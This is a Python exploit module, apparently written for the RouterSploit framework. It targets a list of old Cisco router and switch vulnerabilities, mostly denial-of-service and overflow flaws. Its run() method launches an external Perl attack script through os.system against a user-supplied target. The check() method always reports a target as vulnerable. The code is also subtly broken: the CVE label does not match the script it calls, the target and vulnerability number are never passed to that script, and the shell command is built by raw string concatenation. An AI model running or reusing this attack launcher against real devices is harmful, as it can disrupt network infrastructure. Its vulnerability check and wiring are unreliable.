



import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient
from ctypes import *


class Exploit(HTTPClient):



    __info__ = {

        "name": "CVE-2002-0886",

        "description": "Cisco Broadband Operating System (CBOS) is the operating system used on Cisco 600 series routers. "
                       "When the CBOS TCP/IP stack is forced to process a high number of unusually large packets, "
                       "it will consume all memory. This will cause the router to freeze and stop forwarding packets.\n "
                       "You can enter the corresponding character to apply exploit:\n"
                        "[1] - Cisco 677/678 Telnet Buffer Overflow Vulnerability\n"
                        "[2] - Cisco IOS Router Denial of Service Vulnerability\n"
                        "[3] - Cisco IOS HTTP Auth Vulnerability\n"
                        "[4] - Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability\n"
                        "[5] - Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability\n"
                        "[6] - Cisco 675 Web Administration Denial of Service Vulnerability\n"
                        "[7] - Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability\n"
                        "[8] - Cisco IOS Software HTTP Request Denial of Service Vulnerability\n"
                        "[9] - Cisco 514 UDP Flood Denial of Service Vulnerability\n"
                        "[10] - CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability\n"
                        "[11] - Cisco Catalyst Memory Leak Vulnerability\n"
                        "[12] - Cisco CatOS CiscoView HTTP Server Buffer Overflow Vulnerability\n"
                        "[13] - %u Encoding IDS Bypass Vulnerability (UTF)\n"
                        "[14] - Cisco IOS HTTP Denial of Service Vulnerability",

        "authors": (

            "###",  # vulnerability discovery
            "###",  # routersploit module
        ),

        "references": (
            "https://www.exploit-db.com/exploits/21472",
        ),

        "devices": (

            "Cisco, CVE-2002-0886"
        ),
    }


    target = OptIP("", "dest_addr IPv4 or IPv6 address")
    num = OptString("","vulnerability number enter 'show info' to see")
    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = 'perl {} {}'.format('CVE-2001-1097.pl',self.target,self.num)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:


            print_error("Exploit failed - target seems to be not vulnerable")



    def check(self):
       
        return True
